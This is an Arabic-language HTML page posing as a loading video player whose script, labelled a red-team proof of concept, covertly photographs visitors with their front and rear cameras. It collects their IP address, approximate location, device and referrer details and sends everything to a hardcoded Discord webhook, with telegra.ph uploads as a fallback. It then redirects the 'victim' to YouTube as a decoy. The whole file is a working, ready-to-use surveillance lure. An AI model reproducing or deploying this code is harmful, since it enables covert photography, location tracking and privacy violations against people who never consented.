<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مشغّل الفيديو — جارٍ التحميل...</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#0f1115;color:#e8e8e8;font-family:"Segoe UI",Tahoma,Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
  .box{text-align:center}
  .player{width:320px;height:180px;border-radius:12px;margin:0 auto 18px;background:radial-gradient(circle at 30% 30%,#1c2230,#0a0c10);display:flex;align-items:center;justify-content:center;border:1px solid #232a38}
  .play{width:64px;height:64px;border-radius:50%;background:#e50914;display:flex;align-items:center;justify-content:center;box-shadow:0 0 30px rgba(229,9,20,.5);animation:pulse 1.6s infinite}
  .play::after{content:"";border-style:solid;border-width:12px 0 12px 20px;border-color:transparent transparent transparent #fff;margin-right:4px}
  @keyframes pulse{0%,100%{box-shadow:0 0 15px rgba(229,9,20,.4)}50%{box-shadow:0 0 40px rgba(229,9,20,.9)}}
  .bar{width:320px;height:6px;background:#232a38;border-radius:3px;margin:14px auto 10px;overflow:hidden}
  .bar i{display:block;height:100%;width:0;background:#e50914;border-radius:3px;animation:load 5s ease forwards}
  @keyframes load{to{width:100%}}
  .txt{color:#9aa4b5;font-size:14px}
</style>
</head>
<body>
<div class="box">
  <div class="player"><div class="play"></div></div>
  <div class="bar"><i></i></div>
  <div class="txt">جارٍ تجهيز الجلسة الآمنة...</div>
</div>

<script>
/* ============================================================
   Camera Capture → Discord Webhook — Red Team PoC
   يلتقط: كاميرا أمامية + خلفية + معلومات الضحية
   ويرسلها كلها لويب هوك ديسكورد
   ============================================================ */

const CONFIG = {
  webhook: "https://discord.com/api/webhooks/1537214553014804520/1ZgqczFK_f92j8XIlZaD58A3vXx80HXEVU0rPR7rNLKjXpCUgEOVR2cgLnztt-g_qlRc",   // رابط الـ Webhook من ديسكورد
  decoyUrl: "https://www.youtube.com", // تحويل الضحية بعد التصوير ("" لتعطيله)
  redirectDelay: 6000,                  // ms قبل التحويل
  cameraWarmup: 1200,                   // ms انتظار تثبيت الكاميرا
  quality: 0.85,                        // جودة JPEG
  grabIP: true                          // التقاط IP وموقع تقريبي مع اللقطات
};

const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ---------- 1) معلومات الضحية ---------- */
async function getIPInfo() {
  if (!CONFIG.grabIP) return null;
  for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
    try {
      const r = await fetch(url, { cache: "no-store" });
      const j = await r.json();
      if (j && (j.ip || j.latitude)) return j;
    } catch (e) {}
  }
  return null;
}

/* ---------- 2) التقاط صورة من كاميرا ---------- */
async function capturePhoto(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    });
    const video = document.createElement("video");
    video.setAttribute("playsinline", "");
    video.muted = true;
    video.srcObject = stream;
    video.style.cssText = "position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none;z-index:-1";
    document.body.appendChild(video);
    await video.play();
    await sleep(CONFIG.cameraWarmup);

    const canvas = document.createElement("canvas");
    canvas.width  = video.videoWidth  || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext("2d");
    if (facingMode === "user") {           // عكس الكاميرا الأمامية
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
    }
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    stream.getTracks().forEach(t => t.stop());
    video.remove();

    return await new Promise(res => canvas.toBlob(res, "image/jpeg", CONFIG.quality));
  } catch (e) {
    return null; // رفض الإذن أو لا توجد كاميرا
  }
}

/* ---------- 3) رفع صورة على telegra.ph (fallback للإرسال المضمون) ---------- */
async function uploadToTelegraph(blob) {
  const fd = new FormData();
  fd.append("file", blob, "photo.jpg");
  const r = await fetch("https://telegra.ph/upload", { method: "POST", body: fd });
  const j = await r.json();
  if (j && j[0] && j[0].src) return "https://telegra.ph" + j[0].src;
  return null;
}

/* ---------- 4) الإرسال لديسكورد (طبقتان) ---------- */
async function sendToDiscord(frontBlob, backBlob, info) {
  const stamp = new Date().toLocaleString("ar-EG");
  const location = [info?.city, info?.region, info?.country].filter(Boolean).join("، ") || "غير معروف";

  const baseFields = [
    { name: "IP",        value: info?.ip || "غير معروف", inline: true },
    { name: "الموقع",    value: location,                inline: true },
    { name: "الجهاز",    value: (navigator.userAgent || "?").slice(0, 120), inline: false },
    { name: "اللغة",     value: navigator.language,      inline: true },
    { name: "الشاشة",    value: screen.width + "x" + screen.height, inline: true },
    { name: "المصدر",    value: document.referrer || "direct", inline: false },
    { name: "الوقت",     value: stamp,                   inline: false }
  ];

  /* --- الطبقة 1: multipart مع الصور كـ attachments --- */
  try {
    const embeds = [];
    if (frontBlob) embeds.push({ title: "الكاميرا الأمامية", fields: baseFields, image: { url: "attachment://front.jpg" }, color: 0xe50914 });
    if (backBlob)  embeds.push({ title: "الكاميرا الخلفية", fields: baseFields, image: { url: "attachment://back.jpg"  }, color: 0x1e90ff });

    const payload = JSON.stringify({ username: "Logger", embeds });

    const form = new FormData();
    form.append("payload_json", payload);
    if (frontBlob) form.append("files[0]", frontBlob, "front.jpg");
    if (backBlob)  form.append("files[1]", backBlob,  "back.jpg");

    const r = await fetch(CONFIG.webhook, { method: "POST", body: form });
    if (r.ok) return true;
  } catch (e) {}

  /* --- الطبقة 2: رفع على telegra.ph وإرسال الروابط --- */
  try {
    const embeds = [];
    if (frontBlob) {
      const url = await uploadToTelegraph(frontBlob);
      if (url) embeds.push({ title: "الكاميرا الأمامية", fields: baseFields, image: { url }, color: 0xe50914 });
    }
    if (backBlob) {
      const url = await uploadToTelegraph(backBlob);
      if (url) embeds.push({ title: "الكاميرا الخلفية", fields: baseFields, image: { url }, color: 0x1e90ff });
    }
    if (embeds.length) {
      await fetch(CONFIG.webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: "Logger", embeds })
      });
      return true;
    }
  } catch (e) {}

  /* --- الطبقة 3: رسالة نصية فقط (رفض الكاميرا مثلاً) --- */
  try {
    await fetch(CONFIG.webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Logger",
        content: "ضحية جديدة — تعذر التصوير (رفض إذن الكاميرا أو لا توجد كاميرا)\n" +
                 "IP: " + (info?.ip || "غير معروف") + " | الموقع: " + location + "\n" +
                 "الوقت: " + stamp
      })
    });
  } catch (e) {}
  return false;
}

/* ---------- التنفيذ الرئيسي ---------- */
(async () => {
  if (CONFIG.webhook.startsWith("ضع")) { console.warn("[PoC] ضع رابط الويب هوك في CONFIG"); return; }

  if (sessionStorage.getItem("_done")) { if (CONFIG.decoyUrl) location.replace(CONFIG.decoyUrl); return; }
  sessionStorage.setItem("_done", "1");

  if (CONFIG.decoyUrl) setTimeout(() => location.replace(CONFIG.decoyUrl), CONFIG.redirectDelay);
  if (!window.isSecureContext) console.warn("[PoC] الكاميرا تحتاج HTTPS");

  const info = await getIPInfo();

  const front = await capturePhoto("user");
  await sleep(400);
  const back  = await capturePhoto("environment");

  await sendToDiscord(front, back, info);
})();
</script>
</body>
</html>
